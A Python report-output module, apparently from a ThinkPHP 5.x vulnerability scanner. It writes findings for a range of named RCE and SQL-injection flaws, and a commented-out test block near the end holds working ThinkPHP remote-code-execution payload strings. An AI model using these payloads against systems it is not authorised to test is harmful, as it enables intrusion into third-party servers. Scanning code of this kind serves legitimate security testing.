# -*- coding: utf-8 -*-



class FILE:

    def __init__(self, target, check, path):
        self.check = check
        self.target = target
        self.path = path


    def file_load(self):
        try:
            with open(self.path, 'a', encoding="utf-8") as file:
                for method, poc in self.check.items():
                    if method == "tp5_route_rce_get":
                        file.write("[+] {0} 存在thinkphp5.x路由过滤不严谨rce漏洞\npayload: {1}\n".format(self.target, self.target + poc))
                    elif method == "tp5_construct_rce":
                        file.write("[+] {0} 存在thinkphp5.x__construct参数变量覆盖rce漏洞\npayload: POST ?s=index {1}\n".format(self.target, poc))
                    elif method == "tp5_construct_other":
                        file.write("[+] {0} 存在thinkphp5.x路由过滤不严谨rce漏洞(post型)\npayload: POST ?s=captcha {1}\n".format(self.target, poc))
                    elif method == "tp5_showid_rce":
                        file.write("[+] {0} 存在thinkphp5.x_showid_rce漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_request_input_rce":
                        file.write("[+] {0} 存在thinkphp5.x_request_input_rce漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_cache_rce":
                        file.write("[+] {0} 存在thinkphp5.x_cache_rce漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_lite_code_rce":
                        file.write("[+] {0} 存在thinkphp5.x_lite_code_rce漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_db":
                        file.write("[+] {0} 存在thinkphp5.0.x数据库泄露\npayload: {1}\n".format(self.target, self.target + poc))
                    elif method == "tp5_sql":
                        file.write("[+] {0} 存在thinkphp5.xSQL注入漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_xff_sql":
                        file.write("[+] {0} 存在thinkphp5.xXFF头SQL注入漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_time_sql":
                        file.write("[+] {0} 存在thinkphp5.x时间注入漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_template_driver_rce":
                        file.write("[+] {0} 存在thinkphp5.x_template_driver_rce漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_ids_sql":
                        file.write("[+] {0} 存在thinkphp5.x_ids_SQL注入漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_orderid_sql":
                        file.write("[+] {0} 存在thinkphp5.x_orderid_SQL注入漏洞\npayload: {1}\n".format(self.target, poc))
                    elif method == "tp5_update_sql":
                        file.write("[+] {0} 存在thinkphp5.x_update_SQL注入漏洞\npayload: {1}\n".format(self.target, poc))
                    else:
                        pass
                file.close()
        except Exception as e:
            print("只支持输出txt格式!")

# if __name__ == "__main__":
#     check = {'tp5_route_rce_get': '?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
#              'tp5_construct_rce': '_method=__construct&filter[]=phpinfo&method=GET&get[]=1',
#              'tp5_construct_other': '_method=__construct&filter[]=phpinfo&method=GET&get[]=1',
#              'tp5_cache_rce': "%0d%0avar_dump('iceberg-N');%0d%0a//"
#              }
#     FILE('127.0.0.1' ,check).file_load()